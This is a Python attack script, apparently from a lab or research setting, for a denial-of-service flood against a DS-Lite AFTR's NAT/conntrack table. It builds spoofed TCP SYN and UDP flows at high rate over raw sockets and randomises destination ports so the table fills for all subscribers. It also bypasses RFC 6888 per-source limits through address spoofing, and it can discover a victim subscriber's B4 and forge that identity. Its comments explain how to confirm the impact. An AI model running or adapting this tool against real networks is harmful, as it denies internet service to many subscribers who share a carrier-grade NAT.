#!/usr/bin/python
# T1 – NAT Binding Table Exhaustion
#
# Attacker positions:
#   (no --tunnel): IPv4-only LAN behind a B4 (e.g. 10.0.1.150), raw IPv4 packets forwarded
#                  through the B4 into the DS-Lite tunnel to the AFTR.
#   --tunnel     : ISP IPv6 network, injecting IPv4-in-IPv6 packets directly at the AFTR.
#                  Outer IPv6 src can be randomised over a prefix to spoof many B4s.
#
# Why the previous version sent 0 packets:
#   Scapy sendp() with a Python list silently fails in some container environments.
#   Fix: use raw AF_PACKET sockets directly; Scapy is used only for packet building.
#   This also removes ~10× per-call overhead of Scapy's socket management.
#
# Other improvements:
#   1. ARP resolved against gateway (B4 LAN IP), not remote dst-ip4.
#   2. Randomised inner IPv4 src prefix for multi-subscriber conntrack diversity.
#   3. Randomised outer IPv6 src prefix to spoof many B4 clients (tunnel mode).
#
# ── Quick-start ──────────────────────────────────────────────────────────────
#
# LAN behind B4 (T1 fast flood):
#   python3 nat_exhaustion.py eth0 --proto udp \
#       --src-ip4 10.0.1.167 --gateway 10.0.1.1 \
#       --dst-ip4 198.51.100.2 --threads 8 --batch 256
#
# ISP / 4-in-6 tunnel (T1 fast, spoof many B4s):
#   python3 nat_exhaustion.py eth-isp --tunnel --proto udp \
#       --src-ip6-prefix 2001:db8:cafe::/48 --aftr-ip6 2001:db8:cafe::10 \
#       --inner-src-prefix 10.0.0.0/16 --dst-ip4 198.51.100.2 \
#       --threads 8 --batch 256
#
# ── Monitor impact on AFTR ───────────────────────────────────────────────────
#   # On AFTR netns:
#   watch -n1 conntrack -C
#   conntrack -L | grep UNREPLIED | wc -l
#   conntrack -L -p udp | wc -l
#   nft list ruleset | grep counter
import argparse
import ipaddress
import random
import signal
import socket as _socket
import struct
import subprocess
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
import threading
import time

def _sigterm_handler(signum, frame):
    raise KeyboardInterrupt()
signal.signal(signal.SIGTERM, _sigterm_handler)

from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.packet import Raw
from scapy.layers.inet6 import IPv6
from scapy.layers.l2 import Ether
from scapy.sendrecv import srp1

from validate_parameters import is_valid_ipv4, is_valid_ipv6, random_ipv6_addr

# ── globals ───────────────────────────────────────────────────────────────────
stop_event   = threading.Event()
# Initialized in main() after args + MAC are known; used by build_batch_bytes()
_tunnel_batches: dict = {}   # 'udp' → _TunnelBatch, 'tcp' → _TunnelBatch
_FIXED_DPORT = None
sent_counter = 0
sent_lock    = threading.Lock()

# ── raw socket sender ─────────────────────────────────────────────────────────

def open_raw_socket(iface):
    """
    Open an AF_PACKET/SOCK_RAW socket bound to iface.
    Requires CAP_NET_RAW (root in this lab).
    Returns the socket, or raises on failure.
    """
    s = _socket.socket(_socket.AF_PACKET, _socket.SOCK_RAW, _socket.htons(0x0003))
    s.bind((iface, 0))
    return s


def send_raw_bytes(sock, raw_list):
    """Send a list of pre-built bytes objects; return count actually sent."""
    sent = 0
    for raw in raw_list:
        try:
            sock.send(raw)
            sent += 1
        except OSError:
            pass
    return sent


# ── MAC resolution ────────────────────────────────────────────────────────────

def resolve_mac_arp(iface, target_ip, src_ip):
    """
    ARP for target_ip (must be on the local segment, e.g. the B4 LAN IP).
    Returns MAC string on success, None on failure.

    Strategy: (1) ping + read system ARP cache, (2) Scapy srp1 fallback.
    Method (1) works reliably in network namespaces where Scapy's raw
    socket ARP can fail.
    """
    # Method 1: ping to populate ARP cache, then read it
    try:
        subprocess.run(["ping", "-c1", "-W1", target_ip],
                       capture_output=True, timeout=3)
        out = subprocess.run(["arp", "-n", target_ip],
                             capture_output=True, text=True, timeout=2).stdout
        for line in out.strip().split("\n"):
            parts = line.split()
            if len(parts) >= 3 and parts[0] == target_ip:
                mac = parts[2]
                if ":" in mac and mac != "(incomplete)":
                    return mac
    except Exception:
        pass

    # Method 2: Scapy raw-socket ICMP probe (may fail in some namespaces)
    try:
        ans = srp1(
            Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src=src_ip, dst=target_ip) / ICMP(),
            iface=iface, timeout=3, verbose=0
        )
        if ans and ans.haslayer(Ether):
            return ans[Ether].src
    except Exception:
        pass
    return None


def resolve_mac_ndp(iface, dst_ip6):
    """NDP resolution – ICMPv6 NS → NA."""
    from scapy.layers.inet6 import ICMPv6ND_NS
    try:
        pkt = srp1(
            Ether(dst="33:33:ff:00:00:10") /
            IPv6(dst=dst_ip6) /
            ICMPv6ND_NS(tgt=dst_ip6),
            iface=iface, timeout=3, verbose=0
        )
        if pkt and pkt.haslayer(Ether):
            return pkt[Ether].src
    except Exception:
        pass
    return None


def derive_gateway(src_ip4):
    """Best-effort: return x.y.z.1 for a src IP x.y.z.w."""
    parts = src_ip4.split('.')
    return '.'.join(parts[:3]) + '.1'


# ── random address helpers ─────────────────────────────────────────────────────

def rand_ip_from_prefix(prefix_str):
    net = ipaddress.IPv4Network(prefix_str, strict=False)
    host_int = random.randint(
        int(net.network_address) + 1,
        int(net.broadcast_address) - 1
    )
    return str(ipaddress.IPv4Address(host_int))


def rand_ipv6_from_prefix(prefix_str):
    return str(random_ipv6_addr(prefix_str))


# ── packet builders (return bytes) ────────────────────────────────────────────

_DST_PORTS = [80, 443, 8080, 8443, 25, 22, 21, 110, 143]


def build_ipv4_bytes(proto, src_ip, dst_ip, sport, dport, dmac):
    eth = Ether(dst=dmac)
    ip  = IP(src=src_ip, dst=dst_ip, ttl=64,
             id=random.randint(0, 65535), flags='DF')
    if proto == 'udp':
        pkt = eth / ip / UDP(sport=sport, dport=dport) / Raw(load=b'\x00' * 8)
    else:
        pkt = eth / ip / TCP(sport=sport, dport=dport, flags='S',
                             seq=random.randint(0, 2**32 - 1))
    return pkt.build()


def build_4in6_bytes(proto, src_ip6, dst_ip6, inner_src4, inner_dst4,
                     sport, dport, dmac):
    eth  = Ether(dst=dmac)
    ipv6 = IPv6(src=src_ip6, dst=dst_ip6, nh=4)
    ip4  = IP(src=inner_src4, dst=inner_dst4, ttl=63,
              id=random.randint(0, 65535), flags='DF')
    if proto == 'udp':
        pkt = eth / ipv6 / ip4 / UDP(sport=sport, dport=dport) / Raw(load=b'\x00' * 8)
    else:
        pkt = eth / ipv6 / ip4 / TCP(sport=sport, dport=dport, flags='S',
                                      seq=random.randint(0, 2**32 - 1))
    return pkt.build()


# ── fast checksum helpers ─────────────────────────────────────────────────────

def _ipv4_cksum(hdr20) -> int:
    """One's-complement checksum over 20-byte IPv4 header (cksum field pre-zeroed)."""
    s = sum(struct.unpack_from('!10H', hdr20))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def _tcp4_cksum(src4: bytes, dst4: bytes, tcp_hdr: bytes) -> int:
    """TCP checksum over IPv4 pseudo-header + TCP header (cksum field pre-zeroed)."""
    n    = len(tcp_hdr)
    data = src4 + dst4 + b'\x00\x06' + struct.pack('!H', n) + tcp_hdr
    if len(data) & 1:
        data += b'\x00'
    s = sum(struct.unpack_from(f'!{len(data) >> 1}H', data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


# ── struct-based 4-in-6 batch builder ────────────────────────────────────────
#
# Frame layout for ETH / IPv6 / IPv4 / UDP|TCP (no VLAN):
#   ETH(14):  dst[0:6] src[6:12] type[12:14]=0x86DD
#   IPv6(40): ver/tc/flow[14:18] paylen[18:20] nh[20]=4 hoplim[21]
#             src[22:38] dst[38:54]
#   IPv4(20): ver/ihl[54] dscp[55] totlen[56:58] id[58:60]
#             flags/frag[60:62] ttl[62] proto[63] cksum[64:66]
#             src[66:70] dst[70:74]
#   UDP(8):   sport[74:76] dport[76:78] len[78:80] cksum[80:82]
#   TCP(20):  sport[74:76] dport[76:78] seq[78:82] ack[82:86]
#             off/flags[86:88] window[88:90] cksum[90:92] urg[92:94]

class _TunnelBatch:
    """
    Pre-builds one reference 4-in-6 packet via Scapy, then generates batches
    by copying the bytearray template and patching only the variable fields
    with struct.pack_into.  ~20× faster than calling Scapy .build() per packet.
    """
    _IPV6_SRC  = 22
    _IPV4_OFF  = 54
    _IPV4_CKSUM = 64
    _IPV4_SRC  = 66
    _IPV4_DST  = 70
    _L4_SPORT  = 74    # same offset for TCP sport and UDP sport
    _L4_DPORT  = 76    # destination port (TCP and UDP)
    _UDP_CKSUM = 80
    _TCP_SEQ   = 78
    _TCP_CKSUM = 90

    def __init__(self, proto: str, src_ip6: str, aftr_ip6: str,
                 inner_src4: str, inner_dst4: str,
                 sport: int, dport: int, dmac: str):
        self.proto = proto
        # Build one valid reference frame (checksums computed by Scapy)
        self._ref = bytearray(
            build_4in6_bytes(proto, src_ip6, aftr_ip6,
                             inner_src4, inner_dst4, sport, dport, dmac)
        )
        # Prefix integer ranges (None = field is fixed in template)
        self._v6_lo = self._v6_hi   = None
        self._s4_lo = self._s4_hi   = None
        self._d4_lo = self._d4_hi   = None

    def set_ipv6_prefix(self, prefix: str):
        net = ipaddress.IPv6Network(prefix, strict=False)
        self._v6_lo = int(net.network_address) + 1
        self._v6_hi = int(net.broadcast_address) - 1

    def set_inner_src_prefix(self, prefix: str):
        net = ipaddress.IPv4Network(prefix, strict=False)
        self._s4_lo = int(net.network_address) + 1
        self._s4_hi = int(net.broadcast_address) - 1

    def set_dst_prefix(self, prefix: str):
        net = ipaddress.IPv4Network(prefix, strict=False)
        self._d4_lo = int(net.network_address) + 1
        self._d4_hi = int(net.broadcast_address) - 1

    def build(self, n: int) -> list:
        ref     = self._ref
        proto   = self.proto
        v6_lo, v6_hi = self._v6_lo, self._v6_hi
        s4_lo, s4_hi = self._s4_lo, self._s4_hi
        d4_lo, d4_hi = self._d4_lo, self._d4_hi
        need_v4ck = (s4_lo is not None) or (d4_lo is not None)
        result  = []

        for _ in range(n):
            buf = bytearray(ref)

            # Outer IPv6 source (B4 identity)
            if v6_lo is not None:
                v6 = random.randint(v6_lo, v6_hi)
                struct.pack_into('!QQ', buf, self._IPV6_SRC,
                                 v6 >> 64, v6 & 0xFFFFFFFFFFFFFFFF)

            # Inner IPv4 src / dst
            if s4_lo is not None:
                struct.pack_into('!I', buf, self._IPV4_SRC,
                                 random.randint(s4_lo, s4_hi))
            if d4_lo is not None:
                struct.pack_into('!I', buf, self._IPV4_DST,
                                 random.randint(d4_lo, d4_hi))

            # Recompute IPv4 header checksum if any IP changed
            if need_v4ck:
                struct.pack_into('!H', buf, self._IPV4_CKSUM, 0)
                struct.pack_into('!H', buf, self._IPV4_CKSUM,
                                 _ipv4_cksum(buf[self._IPV4_OFF: self._IPV4_OFF + 20]))

            # L4 sport + dport (both always randomised). Varying the
            # DESTINATION port is essential for conntrack exhaustion: with a
            # single shared public IPv4 the AFTR SNATs each flow to
            # 192.0.2.1:1024-65535 keyed per-destination-endpoint, so if every
            # flow targets one fixed dport they all compete for that endpoint's
            # 64512 external ports and the table hard-caps at ~64512 (and other
            # subscribers, using a different dport, stay reachable). Spreading
            # dport across the full range multiplies the reachable destination
            # endpoints so the global conntrack table fills to nf_conntrack_max
            # (262144) — the real cross-subscriber DoS (RFC 6888). The UDP
            # checksum is zeroed below and conntrack does not verify L4
            # checksums, so patching dport in place is safe.
            struct.pack_into('!H', buf, self._L4_SPORT, random.randint(1024, 65535))
            struct.pack_into('!H', buf, self._L4_DPORT, self._fixed_dport if getattr(self,'_fixed_dport',None) else random.randint(1, 65535))

            if proto == 'tcp':
                struct.pack_into('!I', buf, self._TCP_SEQ,
                                 random.randint(0, 0xFFFFFFFF))
                # Recompute TCP checksum (pseudo-header over inner IPv4 src/dst)
                struct.pack_into('!H', buf, self._TCP_CKSUM, 0)
                struct.pack_into('!H', buf, self._TCP_CKSUM,
                                 _tcp4_cksum(bytes(buf[self._IPV4_SRC: self._IPV4_SRC + 4]),
                                             bytes(buf[self._IPV4_DST: self._IPV4_DST + 4]),
                                             bytes(buf[74:94])))
            else:
                # IPv4 UDP: setting checksum = 0 disables it (RFC 768) — valid and fast
                struct.pack_into('!H', buf, self._UDP_CKSUM, 0)

            result.append(bytes(buf))

        return result


def build_batch_bytes(args, dmac, batch_size):
    """Return a list of raw bytes objects, one per packet."""
    proto = args.proto if args.proto != 'both' else random.choice(['tcp', 'udp'])

    # ── fast path: struct-based template patching for tunnel mode ─────────────
    if args.tunnel and _tunnel_batches:
        tb = _tunnel_batches.get(proto) or _tunnel_batches.get('udp')
        if tb:
            return tb.build(batch_size)

    # ── fallback / LAN path: Scapy build per packet ───────────────────────────
    result = []
    for _ in range(batch_size):
        sport   = random.randint(1024, 65535)
        # Full-range dport: spreading the destination endpoint is what lets the
        # global conntrack table fill past one endpoint's 64512-port SNAT
        # ceiling (see _TunnelBatch.build note). _DST_PORTS is kept for tools
        # that want realistic service ports.
        dport   = args.fixed_dport if getattr(args,'fixed_dport',None) else random.randint(1, 65535)
        dst_ip4 = (rand_ip_from_prefix(args.dst_prefix)
                   if args.dst_prefix else (args.dst_ip4 or '198.51.100.2'))

        if args.tunnel:
            src6   = (rand_ipv6_from_prefix(args.src_ip6_prefix)
                      if args.src_ip6_prefix else args.src_ip6)
            inner4 = (rand_ip_from_prefix(args.inner_src_prefix)
                      if args.inner_src_prefix else args.inner_src_ip4)
            raw = build_4in6_bytes(proto, src6, args.aftr_ip6, inner4, dst_ip4,
                                   sport, dport, dmac)
        else:
            # LAN mode: use --src-prefix to spoof many inner IPs (bypasses REQ-4 cap)
            src_ip = (rand_ip_from_prefix(args.src_prefix)
                      if getattr(args, 'src_prefix', None) else (args.src_ip4 or '10.0.1.150'))
            raw = build_ipv4_bytes(proto, src_ip, dst_ip4, sport, dport, dmac)

        result.append(raw)

    return result


# ── worker threads ─────────────────────────────────────────────────────────────

def worker_fast(args, dmac, thread_id):
    """T1: Maximum-rate burst using raw AF_PACKET socket."""
    global sent_counter

    try:
        sock = open_raw_socket(args.interface)
    except OSError as e:
        print(f"\n[!] Thread {thread_id}: failed to open raw socket: {e}",
              file=sys.stderr)
        return

    batch_size = args.batch
    try:
        while not stop_event.is_set():
            try:
                raw_pkts = build_batch_bytes(args, dmac, batch_size)
                n = send_raw_bytes(sock, raw_pkts)
                with sent_lock:
                    sent_counter += n
            except Exception as e:
                # Report first error per thread, then keep going
                print(f"\n[!] Thread {thread_id} error: {e}", file=sys.stderr)
                time.sleep(0.05)
    finally:
        sock.close()


def preflight_test(iface, dmac, args):
    """Send one test packet and verify the raw socket works. Returns True on success."""
    try:
        sock = open_raw_socket(iface)
    except OSError as e:
        print(f"[!] Cannot open raw socket on {iface}: {e}")
        print("[!] Ensure you are running as root (or with CAP_NET_RAW).")
        return False

    try:
        raw_pkts = build_batch_bytes(args, dmac, 1)
        sock.send(raw_pkts[0])
        sock.close()
        print(f"[*] Preflight OK – test packet sent on {iface}.")
        return True
    except OSError as e:
        sock.close()
        print(f"[!] Preflight send failed: {e}")
        return False


# ── progress printer ───────────────────────────────────────────────────────────

def progress_printer(duration):
    start = time.time()
    while not stop_event.is_set():
        elapsed = time.time() - start
        with sent_lock:
            total = sent_counter
        rate = total / elapsed if elapsed > 0 else 0
        print(f"\r  [*] Sent: {total:,}  Rate: {rate:.0f} pkt/s  "
              f"Elapsed: {elapsed:.0f}s", end='', flush=True)
        if duration and elapsed >= duration:
            stop_event.set()
        time.sleep(0.5)
    print()


# ── main ───────────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description="T1 – NAT Binding Table Exhaustion\n"
                    "Floods unique TCP/UDP flows to exhaust AFTR conntrack table.\n\n"
                    "Uses raw AF_PACKET sockets for reliable, high-throughput sending.\n"
                    "Scapy is used only for packet building.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # T1 fast flood from B4-1 LAN (attacker IP 10.0.1.167, gateway 10.0.1.1):
  python3 nat_exhaustion.py eth0 --proto udp \\
      --src-ip4 10.0.1.167 --gateway 10.0.1.1 \\
      --dst-ip4 198.51.100.2 --threads 8 --batch 256

  # T1 fast flood from ISP – spoof many B4s + many inner clients:
  # (Canonical default-mode attack path. RFC 6888 REQ-4 per-source cap —
  # baked into the default nftables ruleset — prevents single-source LAN
  # floods from exhausting the pool. ISP spoofing of the inner IPv4 source
  # bypasses the per-source meter because each forged inner IP gets its
  # own 1000-connection budget. See paper/TRIALS_DEFAULT.md.)
  python3 nat_exhaustion.py eth-isp --tunnel \\
      --src-ip6-prefix 2001:db8:cafe::/48 --aftr-ip6 2001:db8:cafe::10 \\
      --inner-src-prefix 10.0.0.0/16 --dst-ip4 198.51.100.2 \\
      --threads 8 --batch 256

  # T1 fast flood from ISP – fixed single B4, random inner clients:
  python3 nat_exhaustion.py eth-isp --tunnel \\
      --src-ip6 2001:db8:cafe::150 --aftr-ip6 2001:db8:cafe::10 \\
      --inner-src-prefix 10.0.0.0/16 --dst-ip4 198.51.100.2 \\
      --threads 4 --batch 128

Monitor impact on AFTR (run inside AFTR netns):
  watch -n1 conntrack -C                    # live entry count vs nf_conntrack_max
  conntrack -L | grep UNREPLIED | wc -l     # unreplied entries (UDP/TCP SYN)
  conntrack -L -p udp | wc -l              # UDP entries only
  dmesg | grep AFTR-NAT | wc -l            # logged new sessions
  nft list ruleset | grep counter          # nftables hit counters
"""
    )
    p.add_argument('interface', help='Network interface to send from')
    p.add_argument('--fixed-dport', type=int, default=None,
                   help='Target ONE destination port (exhaust its 64512 SNAT ports to deny co-residents reaching that service)')
    p.add_argument('--mode', choices=['fast'], default='fast',
                   help='fast=T1 max-rate flood (default: fast)')
    p.add_argument('--proto', choices=['tcp', 'udp', 'both'], default='udp',
                   help='Transport protocol (default: udp)')

    # ── LAN mode ──
    p.add_argument('--src-ip4',
                   help='Attacker source IPv4 in LAN mode (e.g. 10.0.1.167)')
    p.add_argument('--src-prefix',
                   help='LAN mode: randomise inner IPv4 source from this CIDR '
                        '(e.g. 10.0.1.0/24). Each spoofed inner IP gets its own '
                        'per-subscriber slot, bypassing RFC 6888 REQ-4 single-IP cap.')
    p.add_argument('--gateway',
                   help='B4 LAN IP to ARP for the next-hop MAC. '
                        'Auto-derived as x.y.z.1 from --src-ip4 if omitted.')
    p.add_argument('--dst-ip4', default='198.51.100.2',
                   help='Fixed destination IPv4 (default: 198.51.100.2)')
    p.add_argument('--dst-prefix',
                   help='Randomise destination IPv4 per packet from this CIDR '
                        '(e.g. 198.51.100.0/24) – increases 5-tuple diversity.')

    # ── Tunnel / ISP mode ──
    p.add_argument('--tunnel', action='store_true',
                   help='Encapsulate flows in IPv6 (attacker on ISP network)')
    p.add_argument('--src-ip6',
                   help='Fixed attacker IPv6 src (tunnel mode; '
                        'mutually exclusive with --src-ip6-prefix)')
    p.add_argument('--src-ip6-prefix',
                   help='Randomise outer IPv6 src per packet from this prefix '
                        '(e.g. 2001:db8:cafe::/48) – spoofs many B4 subscribers.')
    p.add_argument('--discover', action='store_true',
                   help='Tunnel mode: reconnaissance (passive sniff -> guess -> '
                        'active NDP) to find a victim B4 and forge its identity '
                        '(--src-ip6), targeting that subscriber\'s per-B4 cap.')
    p.add_argument('--recon-timeout', type=int, default=8,
                   help='Passive-listen window for --discover (default: 8s)')
    p.add_argument('--recon-src-ip6', default='2001:db8:cafe::13a',
                   help='Attacker outer IPv6 used during --discover (excluded '
                        'from victim selection; default 2001:db8:cafe::13a)')
    p.add_argument('--aftr-ip6', default='2001:db8:cafe::10',
                   help='AFTR IPv6 address (default: 2001:db8:cafe::10)')
    p.add_argument('--inner-src-ip4', default='10.0.1.50',
                   help='Fixed inner IPv4 source for tunnel (default: 10.0.1.50)')
    p.add_argument('--inner-src-prefix',
                   help='Randomise inner IPv4 src per packet from this CIDR '
                        '(e.g. 10.0.0.0/16) – greatly increases conntrack diversity.')

    # ── Common ──
    p.add_argument('--threads', type=int, default=8,
                   help='Worker threads (default: 8)')
    p.add_argument('--batch', type=int, default=256,
                   help='Packets built and sent per loop iteration in fast mode '
                        '(default: 256)')
    p.add_argument('--rate', type=float, default=10.0,
                   help='Flows per second per thread in slow mode (default: 10)')
    p.add_argument('--duration', type=int, default=0,
                   help='Stop after N seconds (0=unlimited, default: 0)')
    p.add_argument('--dmac',
                   help='Force destination MAC (skip ARP/NDP resolution)')
    args = p.parse_args()

    # ── Reconnaissance (tunnel mode): discover a victim B4 to forge ────────────
    # With --discover, find a victim B4 via the recon ladder and forge its outer
    # IPv6 (--src-ip6), so the flood fills THAT subscriber's per-B4 cap.
    if args.tunnel and args.discover and not args.src_ip6 and not args.src_ip6_prefix:
        import os as _os, sys as _sys
        _sys.path.insert(0, _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))))
        try:
            import recon as _recon
            r = _recon.discover(args.interface, args.recon_src_ip6, args.aftr_ip6,
                                passive_timeout=args.recon_timeout)
        except Exception as e:
            print(f"[!] recon failed: {e}"); r = None
        if not r:
            p.error('recon found no victim B4; supply --src-ip6 / --src-ip6-prefix')
        args.src_ip6 = r["victim_b4"]
        args.aftr_ip6 = r.get("aftr") or args.aftr_ip6
        print(f"[*] Recon picked victim B4 {args.src_ip6} (AFTR {args.aftr_ip6}) "
              f"via {r['method']} - forging its identity to fill its cap")

    # ── Validation ────────────────────────────────────────────────────────────
    if args.tunnel:
        if not args.src_ip6 and not args.src_ip6_prefix:
            p.error('--tunnel requires --src-ip6, --src-ip6-prefix, or --discover')
        if args.src_ip6 and not is_valid_ipv6(args.src_ip6):
            p.error(f'Invalid --src-ip6: {args.src_ip6}')
        if not is_valid_ipv6(args.aftr_ip6):
            p.error(f'Invalid --aftr-ip6: {args.aftr_ip6}')
    else:
        if args.src_ip4 and not is_valid_ipv4(args.src_ip4):
            p.error(f'Invalid --src-ip4: {args.src_ip4}')
        if args.gateway and not is_valid_ipv4(args.gateway):
            p.error(f'Invalid --gateway: {args.gateway}')
    if not is_valid_ipv4(args.dst_ip4):
        p.error(f'Invalid --dst-ip4: {args.dst_ip4}')
    for opt, val in [('--dst-prefix', args.dst_prefix),
                     ('--inner-src-prefix', args.inner_src_prefix)]:
        if val:
            try:
                ipaddress.IPv4Network(val, strict=False)
            except ValueError as e:
                p.error(f'Invalid {opt}: {e}')
    if args.src_ip6_prefix:
        try:
            ipaddress.IPv6Network(args.src_ip6_prefix, strict=False)
        except ValueError as e:
            p.error(f'Invalid --src-ip6-prefix: {e}')

    # ── MAC resolution ────────────────────────────────────────────────────────
    if args.dmac:
        dmac = args.dmac
        print(f"[*] Using forced dst MAC: {dmac}")
    elif args.tunnel:
        print(f"[*] Resolving NDP for AFTR {args.aftr_ip6} …")
        dmac = resolve_mac_ndp(args.interface, args.aftr_ip6)
        if not dmac:
            print("[!] NDP failed – using multicast fallback 33:33:00:00:00:10")
            dmac = "33:33:00:00:00:10"
        print(f"[*] AFTR MAC: {dmac}")
    else:
        src = args.src_ip4 or "10.0.1.150"
        gw  = args.gateway or derive_gateway(src)
        print(f"[*] Resolving ARP for gateway {gw} (B4 LAN IP) …")
        dmac = resolve_mac_arp(args.interface, gw, src)
        if not dmac:
            print(f"[!] ARP for {gw} failed – verify --gateway is the B4 LAN IP")
            print("[!] Using broadcast fallback ff:ff:ff:ff:ff:ff")
            dmac = "ff:ff:ff:ff:ff:ff"
        print(f"[*] Gateway (B4) MAC: {dmac}")

    # ── Tunnel template initialisation (fast path for ISP mode) ──────────────
    if args.tunnel:
        src6_seed   = (rand_ipv6_from_prefix(args.src_ip6_prefix)
                       if args.src_ip6_prefix else args.src_ip6)
        inner4_seed = (rand_ip_from_prefix(args.inner_src_prefix)
                       if args.inner_src_prefix else (args.inner_src_ip4 or '10.0.1.50'))
        dst4_seed   = (rand_ip_from_prefix(args.dst_prefix)
                       if args.dst_prefix else (args.dst_ip4 or '198.51.100.2'))
        protos = ['udp', 'tcp'] if args.proto == 'both' else [args.proto]
        for p in protos:
            tb = _TunnelBatch(p, src6_seed, args.aftr_ip6,
                              inner4_seed, dst4_seed,
                              random.randint(1024, 65535),
                              random.choice(_DST_PORTS), dmac)
            if args.src_ip6_prefix:
                tb.set_ipv6_prefix(args.src_ip6_prefix)
            if args.inner_src_prefix:
                tb.set_inner_src_prefix(args.inner_src_prefix)
            if args.dst_prefix:
                tb.set_dst_prefix(args.dst_prefix)
            tb._fixed_dport = args.fixed_dport
            _tunnel_batches[p] = tb
        print(f"[*] Tunnel template built for proto={args.proto} "
              f"(struct-patch fast path active)")

    # ── Preflight ─────────────────────────────────────────────────────────────
    if not preflight_test(args.interface, dmac, args):
        sys.exit(1)

    # ── Summary ───────────────────────────────────────────────────────────────
    mode_label   = "T1 Fast NAT Exhaustion"
    tunnel_label = "4-in-6 tunnel (ISP)" if args.tunnel else "IPv4 LAN (via B4)"
    print()
    print(f"[*] Mode:      {mode_label}")
    print(f"[*] Transport: {args.proto.upper()}")
    print(f"[*] Placement: {tunnel_label}")
    print(f"[*] Threads:   {args.threads}")
    print(f"[*] Batch:     {args.batch} pkts/iter × {args.threads} threads")
    if args.tunnel:
        if args.src_ip6_prefix:
            print(f"[*] Outer IPv6: random from {args.src_ip6_prefix}  (spoofing many B4s)")
        else:
            print(f"[*] Outer IPv6: {args.src_ip6}  (single B4)")
        if args.inner_src_prefix:
            print(f"[*] Inner IPv4: random from {args.inner_src_prefix}")
        else:
            print(f"[*] Inner IPv4: {args.inner_src_ip4}  (fixed)")
    if args.dst_prefix:
        print(f"[*] Dst IPv4:  random from {args.dst_prefix}")
    else:
        print(f"[*] Dst IPv4:  {args.dst_ip4}  (fixed)")
    if args.duration:
        print(f"[*] Duration:  {args.duration}s")
    print()
    print("[!] Monitor AFTR (run in AFTR netns):")
    print("      watch -n1 conntrack -C")
    print("      conntrack -L | grep UNREPLIED | wc -l")

    print("[*] Starting attack … Ctrl+C to stop.\n")

    # ── Launch workers ────────────────────────────────────────────────────────
    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=worker_fast, args=(args, dmac, i), daemon=True)
        t.start()
        threads.append(t)

    try:
        progress_printer(args.duration)
    except KeyboardInterrupt:
        print("\n[*] Interrupted.")
        stop_event.set()

    for t in threads:
        t.join(timeout=2)

    with sent_lock:
        total_sent = sent_counter
    print(f"\n[+] Done. Total flows sent: {total_sent:,}")
    print("[!] Confirm impact by live investigation on the AFTR, e.g.:")
    print("      conntrack -C                         # binding count")
    print("      conntrack -S                         # early_drop = GC evictions")
    print("      nft -a list chain ip filter forward | grep connlimit")


if __name__ == '__main__':
    main()
